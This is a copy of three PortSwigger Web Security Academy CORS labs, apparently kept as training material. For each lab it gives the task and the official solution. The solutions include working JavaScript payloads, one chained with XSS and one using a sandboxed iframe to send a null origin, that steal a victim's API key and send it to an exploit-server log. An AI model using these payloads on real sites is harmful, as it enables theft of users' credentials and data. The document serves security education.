# PortSwigger labs: cors

> Copied from <https://portswigger.net/web-security/cors>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. CORS vulnerability with basic origin reflection

[Open the lab](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

<details><summary>Official solution</summary>

1. Check intercept is off, then use the browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header:

   `Origin: https://example.com`
4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
5. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL:

   `<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
   location='/log?key='+this.responseText;
   };
   </script>`
6. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
7. Go back to the exploit server and click **Deliver exploit to victim**.
8. Click **Access log**, retrieve and submit the victim's API key to complete the lab.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=XTFDst3TjMM

##### Popo Hack

https://www.youtube.com/watch?v=2qtI3hNrWRw

</details>


## 2. CORS vulnerability with trusted insecure protocols

[Open the lab](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

<details><summary>Hint</summary>

If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.

</details>

<details><summary>Official solution</summary>

1. Check intercept is off, then use Burp's browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name.
4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
5. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain.
6. Observe that the `productID` parameter is vulnerable to XSS.
7. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with your exploit server ID:

   `<script>
   document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
   </script>`
8. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
9. Go back to the exploit server and click **Deliver exploit to victim**.
10. Click **Access log**, retrieve and submit the victim's API key to complete the lab.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=pYw6lciCBCw

##### Popo Hack

https://www.youtube.com/watch?v=8613OyiUrX8

</details>


## 3. CORS vulnerability with trusted null origin

[Open the lab](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

<details><summary>Official solution</summary>

1. Check intercept is off, then use Burp's browser to log in to your account. Click "My account".
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header `Origin: null.`
4. Observe that the "null" origin is reflected in the `Access-Control-Allow-Origin` header.
5. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with the URL for your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with the exploit server ID:

   `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
   location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
   };
   </script>"></iframe>`

   Notice the use of an iframe sandbox as this generates a null origin request.
6. Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.
7. Go back to the exploit server and click "Deliver exploit to victim".
8. Click "Access log", retrieve and submit the victim's API key to complete the lab.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=UVB5SH21Ygk

##### Popo Hack

https://www.youtube.com/watch?v=JkBpebHWv2k

</details>

